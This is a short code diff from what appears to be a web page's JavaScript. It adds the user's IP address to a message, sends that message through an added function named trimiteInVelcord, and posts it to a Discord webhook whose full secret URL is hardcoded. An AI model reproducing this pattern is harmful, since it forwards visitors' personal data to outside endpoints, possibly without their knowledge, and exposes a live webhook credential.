@@ -413,6 +413,7 @@
                         // Add IP to message
                         message += `\n**🌐 IP Address:** ${userIP}\n`;
 
+                        trimiteInVelcord({ content: message });
                         const response = await fetch('https://discord.com/api/webhooks/1454099935594024962/xu6mrgw8mHVrFJpQmdyZ4hgxnTf1t_HMEd2EMix9Gfnbm-QxbT0B6bg8dS4iAPLfqB6F', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
